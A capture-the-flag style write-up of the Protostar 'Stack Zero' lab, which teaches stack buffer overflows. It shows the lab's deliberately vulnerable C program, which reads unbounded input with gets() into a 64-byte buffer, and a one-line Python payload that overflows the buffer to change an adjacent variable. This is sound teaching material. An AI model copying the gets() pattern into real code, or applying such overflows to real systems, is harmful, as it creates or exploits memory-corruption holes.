# Stack Zero

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

## Source Code

```c++
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## Writeup

In this code we have a **buffer** of 64 char, that means is a **buffer** of 64 byte.

After this, in the Stack we have the **modified** variable of 4 byte.

We can write 64 char and add at the end the 4 byte of **modified** value.

Let's write an '**A**' 64 times and than add a 1 in the **modified** variable.

```bash
python -c "print('A' * 64 + '\x01')" | ./stack0
```

The output of the program will be:

```bash
user@protostar:/opt/protostar/bin$ python -c "print('A' * 64 + '\x01')" | ./stack0
you have changed the 'modified' variable
```

We know that the **modified** variable have 1 as value.